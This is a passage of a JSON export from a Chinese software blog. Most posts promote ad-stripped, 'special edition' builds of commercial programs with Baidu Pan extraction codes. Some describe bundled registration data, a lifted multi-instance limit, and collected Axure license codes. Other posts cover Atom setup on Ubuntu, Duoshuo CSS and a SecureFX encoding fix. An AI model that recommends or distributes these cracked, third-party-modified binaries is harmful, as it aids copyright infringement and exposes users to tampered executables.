rde1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"JJplayer-吉吉影音，快播同类软件","slug":"software-player-jjplayer","date":"2017-03-15T01:18:50.000Z","updated":"2017-03-15T01:18:50.000Z","comments":true,"path":"software-player-jjplayer.html","permalink":"https://sobaigu.com/software-player-jjplayer.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：22.3 m 支持系统：Windows 官方主页： 软件介绍 去年在快播、百度影音两大佬倒下之后，吉吉、西瓜等填补了市场，继续免费在线观看下载各种网民需要的影视。它堪称快播播放器复活版！ 吉吉影音是在线P2P技术的播放器，全格式支持，极速播放，边播边下，随点随看，灵活点播，时间自由掌握；随时拖动看你所爱；自动记录观看位置，再次观看接着来；支持自定义设置，满足您个性偏好！吉吉影音支持的CMS系统多，独家支持光线CMS，缓冲速度非常快，占用资源少。 吉吉影音去广告版说明 去所有广告及篡改主页行为 硬改退出不驻留P2P服务进程 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 rde1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"32位Ubuntu系统安装atom","slug":"ubuntu-32-bit-install-atom","date":"2017-03-14T06:36:29.000Z","updated":"2017-03-14T06:36:29.000Z","comments":true,"path":"ubuntu-32-bit-install-atom.html","permalink":"https://sobaigu.com/ubuntu-32-bit-install-atom.html","excerpt":"","text":"前言 atom是个不错的编辑器，虽然体积有点大，汉化的也不够好。其跨平台，开源免费，集成Git更改状态显示，原生支持MarkDown，文件目录管理，多开标签显示等优点，还是蛮讨人喜欢。 有个破笔记本，安装了32位的ubuntu，但atom官网是下载不到对应版本，只有64bit版本。 添加PPA源安装 打开终端执行界面，执行以下命令即可安装 123sudo add-apt-repository ppa:webupd8team/atomsudo apt-get updatesudo apt-get install atom 卸载atom并删除PPA源 如果要卸载atom，可以使用以下命令 123sudo apt-get remove atom#删除PPA源sudo add-apt-repository --remove ppa:webupd8team/atom","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"搜狗输入法手机版_去广告纯净版","slug":"software-android-sogouinput","date":"2017-03-12T05:29:10.000Z","updated":"2017-03-24T05:29:10.000Z","comments":true,"path":"software-android-sogouinput.html","permalink":"https://sobaigu.com/software-android-sogouinput.html","excerpt":"","text":"基本信息 程序类型：安装版 界面语言：中文 文件大小：22.4 m 支持系统：Android 官方主页：www.sogou.com 软件介绍 搜狗输入法手机版，搜狗拼音输入法安卓版，打字超准、词库超大、速度飞快、外观漂亮、用了让您爱不释手的输入法，是您装机必备的好选择。 关于版本—by 流风轻音 简而言之：无广告，无升级，无桌面图标，无多余功能，轻巧少占内存，输入清爽舒适。 去除大部分的敏感权限和后台服务 去除各种不必要的活动项与接收器 去除首次运行提示和卸载的反馈页 去除界面以及后台的全部垃圾广告 去除程序功能菜单的所有无用选项 去除自带的皮肤文件以及细胞词库 去除分享帮助反馈应用推荐等功能 去除热词速递且无通知栏热词提示 去除恶心的小红点和状态栏小图标 更新emoji表情手工补全堪称完美 禁止应用检测升级不会弹更新提示 调整根目录零散文件到同一文件夹 优化其他细节内容及部分选项菜单 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 56kc","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"多说评论-头像旋转-隐藏底部版权文字-自定义CSS","slug":"web-duoshuo-css-define","date":"2017-03-10T07:13:57.000Z","updated":"2017-03-10T07:13:57.000Z","comments":true,"path":"web-duoshuo-css-define.html","permalink":"https://sobaigu.com/web-duoshuo-css-define.html","excerpt":"","text":"前言 逛别人的博客，发现人家用的多说鼠标移过去，多说用户头像会旋转下，多说评论框也有底纹背景，显示操作系统，浏览器版本，博主标记等。可以挑自己需要的对应改造下，多说感觉现在也不维护了，期待多说能提供这些个性设置。 头像旋转 鼠标移到多说评论区，整个嵌套框内的用户头像都会跟着一起旋转，需要添加hover属性，设置方法： 在多说对应网站设置后台找到：设置&gt;基本设置&gt;自定义CSS，在框里填入如下内容： 1234567891011121314151617181920.sskadmin:hover &#123; opacity: 1;&#125;/*头像样式*/#ds-reset .ds-avatar&#123;background:none !important; box-shadow:none !important;&#125;#ds-reset .ds-avatar img , #ds-thread #ds-reset ul.ds-children .ds-avatar img&#123;width:50px !important;height: 50px !important;-webkit-transition: .9s;-moz-transition: .9s;-o-transition: .9s;-ms-transition: .9s;padding: 2px;border: 1px solid #ddd;background: #fff;&#125;/*鼠标悬停旋转头像*/.ds-post:hover .ds-avatar img&#123;transform:rotate(360deg);-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-o-transform:rotate(360deg);-ms-transform:rotate(360deg);border-radius:30px !important;&#125;#ds-reset .ds-avatar img:hover&#123;transform:rotate(360deg);-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-o-transform:rotate(360deg);-ms-transform:rotate(360deg);border-radius:30px !important;&#125;/*通用样式，不加这个的话多说嵌套层头像会间距不够*/#ds-thread #ds-reset .ds-comment-body, #ds-thread #ds-reset ul.ds-children .ds-comment-body&#123;padding-left:70px !important;&#125;#ds-thread #ds-reset .ds-comment-body, #ds-thread #ds-reset ul.ds-children .ds-comment-body&#123;padding-left:70px !important;&#125;.ds-post:hover&#123;background:#eee !important;&#125;#ds-thread #ds-reset ul.ds-children .ds-avatar&#123;width:50px !important;&#125;#ds-thread #ds-reset .ds-replybox&#123;padding: 0 0 0 80px !important;&#125;#ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-body&#123;margin-left: 68px !important;&#125;#ds-recent-comments li.ds-comment:nth-of-type(1)&#123;border:none !important;&#125;#ds-thread&#123; border-radius: 3px; &#125; 去掉多说版权信息的 还是在多说后台，自定义CSS中加入：.ds-powered-by&#123; display: none;&#125;，然后多说评论框下方的多说强力驱动字样就没了。 添加显示User Agent功能 这个看上去挺酷炫的，但需要本地化多说embed.js，而且网上找的方法也不适合最新版本的多说核心js，就此作罢，感兴趣的可以查看文末参考文档修改。 参考文档 多说样式折腾记录 — 添加 UA 浏览器标识、旋转头像等 [多说自定义CSS 多说评论显示User Agent](http://theme-next.iissnan.com/theme-settings.html#多说评论显示 UA) 如何为博客增加打赏功能","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Total Commander-高效的文件管理器","slug":"software-tool-Total-Commander","date":"2017-03-06T19:53:00.000Z","updated":"2017-03-06T19:53:00.000Z","comments":true,"path":"software-tool-Total-Commander.html","permalink":"https://sobaigu.com/software-tool-Total-Commander.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：7.5 m 支持系统：Windows/Android 官方主页：www.ghisler.com 软件介绍 Total Commander 是一款应用于 Windows 平台的文件管理器 ，它包含两个并排的窗口，这种设计可以让用户方便地对不同位置的“文件或文件夹”进行操作，例如复制、移动、删除、比较等，相对 Windows 资源管理器而言方便很多，极大地提高了文件操作的效率，被广大软件爱好者亲切地简称为：TC 。 它拥有文件快速预览、快速搜索、多标签、文件比较、批量重命名、FTP 客户端等诸多实用的功能，并可通过大量的插件进行个性化配置。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 r81t","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Notepad2-mod_Windows自带记事本的绝佳替代","slug":"software-notepad2-mod","date":"2017-03-04T03:07:26.000Z","updated":"2017-03-24T03:07:26.000Z","comments":true,"path":"software-notepad2-mod.html","permalink":"https://sobaigu.com/software-notepad2-mod.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小： 0.9 m 支持系统：Windows 官方主页：xhmikosr.github.io/notepad2-mod 软件介绍 顾名思义,基于Notepad2的修改版,更美观更智能,Windows自带那个notepad的绝佳替代. 与官方Notepad2相比的更改 代码折叠 支持书签 可自定义当前选中内容颜色 自动补齐功能 语法高亮支持AutoHotkey，AutoIt3，AviSynth，Bash，CMake，Inno Setup，LaTeX，Lua，Markdown，NSIS，Ruby，Tcl和YAML脚本 改进对NFO ANSI编码格式的支持 支持非侵入性的基于注册表的方法替换Windows记事本 支持的操作系统 XP SP3（SP2可能或可能不工作），Vista，7,8，8.1和10都是32位和64位。 下载的压缩包目录中包含了替换系统记事本的批处理,把文件解压到程序需要放的位置后执行批处理即可 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 1e73","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"FastCopy-最快文件复制工具","slug":"software-tool-fastcopy","date":"2017-02-28T19:51:40.000Z","updated":"2017-02-28T19:51:40.000Z","comments":true,"path":"software-tool-fastcopy.html","permalink":"https://sobaigu.com/software-tool-fastcopy.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：1.0 m 支持系统：Windows 官方主页：ipmsg.org/tools/fastcopy.html 软件介绍 FastCopy，最快文件复制工具，Windows平台上最快的文件拷贝、删除软件！功能强劲，性能优越！它是源于日本的高效文件复制加速软件，支持拖曳操作，三种不同HDD模式；支持通配符，任务管理/命令行。 FastCopy-M” 是免费开源软件 “FastCopy” 的一个二次开发分支。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 r81t","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Pencil-开源的原型图绘制工具","slug":"software-design-pencil","date":"2017-02-27T19:08:29.000Z","updated":"2017-02-27T19:08:29.000Z","comments":true,"path":"software-design-pencil.html","permalink":"https://sobaigu.com/software-design-pencil.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：17.6 m 支持系统：Windows/Linux/OSX 官方主页：pencil.evolus.vn 软件介绍 Pencil 是一款开源的原型图绘制工具，手绘风格的，就像自己在纸上画的那样。Pencil 还可以用来绘制各种架构图和流程图，同时还提供 Firefox 的插件，有跨平台版本。 主要功能: 内置多种原型设计模板 多页背景文档 跨页超链接 富文本编辑支持 可导出HTML，PNG，Openoffice.org文件，Word文件和PDF。 撤消/重做支持 支持安装用户定义的模板 标准绘图操作：对齐，排序，缩放，旋转等 这个优秀的原型工具，十分易用，没有操作手册，只要拖拉即可在几分钟内让一个不懂软件开发的人快速做出一个应用的界面来，是需求分析人员的好工具。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 vhuf","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"YY语音_去广告多开版","slug":"software-yyspeak-noad","date":"2017-02-27T02:01:40.000Z","updated":"2017-02-28T02:01:40.000Z","comments":true,"path":"software-yyspeak-noad.html","permalink":"https://sobaigu.com/software-yyspeak-noad.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小： 22.3 m 支持系统：Windows/Linux/OSX 官方主页：www.yy.com 软件介绍 YY语音，又名“歪歪语音”，由欢聚时代(NASDAQ：YY,雷军是大股东）研发，是一款基于网络团队语音的通信平台的计算机软件，主要功能是进行在线多人语音聊天，以及在线真人秀视频互动。 关于去广告多开版-by zd423（专注修改净化） 破解同一机器只能开5个限制，多开无限制！ 去首次启动后桌面生成YY游戏大厅快捷方式； 屏蔽后台偷偷下载YY浏览器及各种推荐应用静默安装流氓渣行为； 去主面板我的频道标签下方广告(展示的推荐频道)，禁止登录面板显示推广Banner； 删除游戏大厅核心组件以及错误报告、日志收集、自动升级、版本更新解包等垃圾文件； 去主面板顶部意见反馈按钮、所有业务图标（用自选补丁会导致聊天表情包页面貌似会不显示)； 屏蔽并阻止后台下载各种推荐应用：电脑玩手游、砸蛋乐园、全名公决、多玩模拟器、以及所有游戏相关应用：游戏特权、游戏大厅、欢聚游戏、游戏宝贝、快快游戏，相关按钮全部点击无效，让你清爽勿扰！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 l3ug","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"MindManager-老牌思维导图软件","slug":"software-mind-manager","date":"2017-02-25T14:37:15.000Z","updated":"2017-02-25T14:37:15.000Z","comments":true,"path":"software-mind-manager.html","permalink":"https://sobaigu.com/software-mind-manager.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文 文件大小：73.6 m 支持系统：Windows 官方主页：www.mindjet.com/mindmanager/ 软件介绍 MindManager是一个可视化的工具，可以用在脑力风暴(brainstorm)和计划(plan)当中。为商务人士提供更有效的、电子化手段捕捉、组织和联系信息(information)和想法(idea)。MindManager运用形象思维方法，使信息同时刺激大脑两个半球，其编辑界面使得用户可以通过“形象速记法”创建并相互交流各种想法和信息。它设计了一个与人的思考方式一致的自然、直接的工作环境，因此能够减少您所花费的时间、精力，减轻压力，从而提高您的工作效率。它简明、直观、弹性伸缩的界面，合理的流水线式交流沟通方式和特别的创新灵感触发机制，最终对项目管理、产品质量监控、服务质量改进，甚至决策，都起到了很好的促进作用。 MindManager创建内容丰富的可视化图形，绘制不同思想直接的关系，向重要信息添加编号和颜色以达到突出强调的目的，使用分界线将同类思想分组，插入图标和图片以方便自己和他人浏览大图；提交功能强大的报告；使用MindManager 预演模式将您的图形显示给他人，或者将图形内容导出到Microsoft PowerPoint中，令复杂的思想和信息得到更快的交流。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 87no","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"AxureRP-网页原型设计首选工具","slug":"software-design-AxureRP","date":"2017-02-24T19:07:57.000Z","updated":"2017-02-24T19:07:57.000Z","comments":true,"path":"software-design-AxureRP.html","permalink":"https://sobaigu.com/software-design-AxureRP.html","excerpt":"","text":"基本信息 程序类型：安装绿色特别版 界面语言：中文英文 文件大小：30.6 m 支持系统：Windows/OSX 官方主页：axure.com 软件介绍 Axure RP是美国Axure Software Solution公司旗舰产品，是一个专业的快速原型设计工具，让负责定义需求和规格、设计功能和界面的专家能够快速创建应用软件或Web网站的线框图、流程图、原型和规格说明文档。作为专门的原型设计工具，它比一般创建静态原型的工具如Visio、Omnigraffle、Illustrator、Photoshop、Dreamweaver、Visual Studio、FireWorks要快速、高效。并且支持Windows和苹果Mac双系统。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 vhuf 其他 Axure rp 8 可用授权码收集","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"亿图图示-优秀的全功能思维导图-流程图绘制软件","slug":"software-mind-map-edrawsoft","date":"2017-02-22T14:36:52.000Z","updated":"2017-04-01T03:56:03.000Z","comments":true,"path":"software-mind-map-edrawsoft.html","permalink":"https://sobaigu.com/software-mind-map-edrawsoft.html","excerpt":"","text":"基本信息 程序类型：安装特别版 界面语言：中文 文件大小：45.5 m 支持系统：Windows/Linux/OSX 官方主页：www.edrawsoft.com 软件介绍 EdrawSoft Edraw Max 是一款综合图示绘制软件，新颖小巧，功能强大，可以很方便的绘制各种专业的流程图、组织结构图、网络拓扑图、家具设计图、商业图表等。 它工作在下面的领域：流程图、网络拓扑图、组织结构图、工作流程图、UML，软件设计、商业图表、2D, 3D 图形、计划 / 报表、地图，方向图、数据库等。 软件特点 人性化设计，提供完善的绘制、修改方法，各种显示模式，随意切换。 与常见的绘图、文档编辑软件的操作方式相似，使用户可以在短时间内掌握软件的使用方法。 丰富的预定义模板库让您绘制图形无需从头开始，只要轻轻的拖曳即可做出漂亮的图形。系统提供的实例模板库，让您思路开阔，在绘图时不断学习进步。 模板形状库中全部矢量绘图，缩放自如，支持插入其它格式的图形和OLE对象，最大限度地减少用户输入量。 绘图过程比用纸笔画图更简单方便和精准，提供统一排版、图层控制等格式设置，让您轻松完成各类专业的流程图、网络图、软件设计图等。 基本绘图工具让您可以通过直线、曲线、弧线、矩形和椭圆工具等元素绘制出新的图形，并可以保存到图形模板库供日后使用，让用户的思想和创意能够淋漓尽致的体现在绘图过程中。 矢量图形抗锯齿。让您绘制的图形在任何角度都保持美观。 无限撤销和重做功能，使用更加方便灵活。 可以输出为亿图专用的绘图格式，或者通用的各种图形格式，您可以将绘制好的流程图文档直接嵌入到WORD，结合流程图专家与WORD的功能制作图文并茂的文档。 所见即所得的操作方式，使用户可以将任何时候看到的绘图形状输出为各种通用的图形格式或直接打印。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 87no","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"金山词霸-绿色去广告版","slug":"software-kingsoft-powerword","date":"2017-02-20T14:23:02.000Z","updated":"2017-02-20T14:23:02.000Z","comments":true,"path":"software-kingsoft-powerword.html","permalink":"https://sobaigu.com/software-kingsoft-powerword.html","excerpt":"","text":"基本信息 程序类型：绿色去广告版 界面语言：中文英文 文件大小：17.5 m 支持系统：Windows/Android/iOS 官方主页：www.iciba.com 软件介绍 金山词霸2016，全新界面设计，新增牛津词典，与柯林斯高阶、英英词典共同组成3000万海量权威在线数据；更强大的精准划译、取词划译、数据同步。 金山词霸是一款经典、权威、免费的老牌翻译软件。金山词霸PC个人版全新界面设计，简洁清爽；提供精准的查词翻译服务，提供牛津、柯林斯等权威词典数据，结合划词，真人语音、屏幕取词等功能轻松学英语！ 本版特点： 去右下角广告弹窗、去底部横幅广告、去界面所有广告、去取词和划译界面广告； 去热点推荐、去界面反馈按钮、去悦读功能(新版暂无法禁止点击,当可去除按钮)； 修改默认配置，点关闭时不自动最小化到状态栏，不自动更新； 禁止后台下载升级文件，去多余其他国家语言和自动升级文件； 注：Edge浏览器目前不支持插件，所以取词没法用！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 9aio","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Notepad++ – 小巧高效的文本编辑器","slug":"software-notepad-plus","date":"2017-02-18T06:04:41.000Z","updated":"2017-02-18T06:04:41.000Z","comments":true,"path":"software-notepad-plus.html","permalink":"https://sobaigu.com/software-notepad-plus.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小： m 支持系统：Windows/Linux/OSX 官方主页：notepad-plus-plus.org 软件介绍 免费全能文本编辑器Notepad++，最近更新增加了64位版，另外更新了诸多插件以及诸多问题修复。Notepad++是一款免费开源的代码编辑器。作为程序员必备代码利器，开发者必备工具！ Notepad++ – 小巧高效的文本编辑器、非常适合编辑网页代码！Notepad++也是一款优秀免费的源代码编辑器，支持语法高亮的开源纯文本编辑器，并且可以替代系统自带的记事本的功能。Notepad++更是程序员们编写代码的利器！它运行便携，体积小巧、资源占用小，支持众多程序语言，比如C++、C#、Java等主流程序语言；支持HTML、XML、ASP，Perl、Python、JavaScript等网页/脚本语言。Notepad++作为程序员们最喜爱的编辑器之一，像语法高亮，语法折叠，宏等编辑器常用功能一个都不少。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 1e73","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"解决SecureFX上传文件中文名乱码","slug":"securefx-sync-filename-with-chinese","date":"2017-02-16T05:36:34.000Z","updated":"2017-02-16T05:36:34.000Z","comments":true,"path":"securefx-sync-filename-with-chinese.html","permalink":"https://sobaigu.com/securefx-sync-filename-with-chinese.html","excerpt":"","text":"背景 SecureCRT+SecureFx套装一直深受喜爱，平常也用的多，可一直没有操作过中文文档。 在使用SecureFx工具将我本地Window的一些文件上传到linux服务器上的时候，发现我上传的中文文件名都变成了乱码。 解决办法 经过比较发现，在SecureFx中看到的文件名不是乱码，通过SecureCRT远程登录查看到的文件名是乱码。而通过SecureCRT远程登录后直接创建的中文文件名在SecureCRT中正常，但是在SecrueFX看到的这个文件名又成了乱码。可见是两边对文件名的编码不一致导致的。 查看了SecureFX的设置项，没有发现设置文件名编码的地方。经过搜索引擎的查找，发现需要手工编辑SecrueFX的这个Session的配置文件才行。 修改方式如下: 在SecureFx中选择Options-&gt;Global Options菜单，在打开的Global Options的对话框中选择General，有一个Configuration folder，里面的路径就是SecureFX的配置文件路径。 在Sessions子目录下找到对应的Session的ini配置文件，在里面将&quot;Filenames Always Use UTF8&quot;=00000000修改为&quot;Filenames Always Use UTF8&quot;=00000001保存重新连接即可。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"WinHex-16进制文件编辑器-数据恢复神器","slug":"software-winhex-datarecovery","date":"2017-02-15T05:47:35.000Z","updated":"2017-02-15T05:47:35.000Z","comments":true,"path":"software-winhex-datarecovery.html","permalink":"https://sobaigu.com/software-winhex-datarecovery.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：1.3 m 支持系统：Windows 官方主页： 软件介绍 WinHex是16进制文件编辑器与磁盘编辑必备软件！它文件小、速度快，功能不输其它Hex十六进位编辑器利器。可做Hex与ASCII码编辑修改，多文件寻替换功能，一般运算及逻辑运算，磁盘磁区编辑 (支持FAT16、FAT32和NTFS)自动搜寻编辑，文件比对和分析，RAM编辑功能等功能。 WinHex 曾经和 UltraEdit 编辑器齐名，但后来两者发展路线截然不同，UltraEdit做了全功能编辑器，而WinHex的功能更加趋于检查和修复各种文件、恢复删除文件、硬盘损坏造成的数据丢失等。利用WinHex可看到其他程序隐藏起来的文件和数据。而且其同样是非常不错的16进制编辑器。 本版特点： 集成简体中文资源，集成注册信息 支持编辑区中文输入，删鸟语帮助文档 换简体中文语言步骤：Help -&gt; Setup -&gt; Chinese 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 